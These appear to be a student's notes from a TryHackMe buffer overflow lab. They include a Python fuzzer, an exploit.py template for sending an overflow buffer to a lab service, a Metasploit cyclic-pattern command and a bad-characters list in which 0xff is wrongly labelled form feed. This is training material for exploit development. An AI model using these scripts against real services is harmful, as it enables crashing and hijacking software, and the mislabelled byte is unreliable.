# Buffer Overflows
## Mona Configuration
- Create a working folder with mona
````
!mona config -set workingfolder c:\mona\%p
````
## Fuzzing
- Python fuzzing script taken from Buffer Overflow room on THM:

````
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.230.146"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
  ````
- Run the `fuzzer.py` script using python: `python3 fuzzer.py`
- The fuzzer will send increasingly long strings comprised of As. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent.
## Crash Replication & Controlling EIP
- Save as exploit.py
````
import socket

ip = "10.10.230.146"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
````
- Run the following command to generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server (change the -l value to this):
````
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
````
- Copy the output and place it into the payload variable of the exploit.py script.
- Rerun the vulnerable piece of software.

## Common Bad Characters
````
0x00     NULL (\0)
0x09     Tab (\t)
0x0a     Line Feed (\n)
0x0d     Carriage Return (\r)
0xff     Form Feed (\f)
````















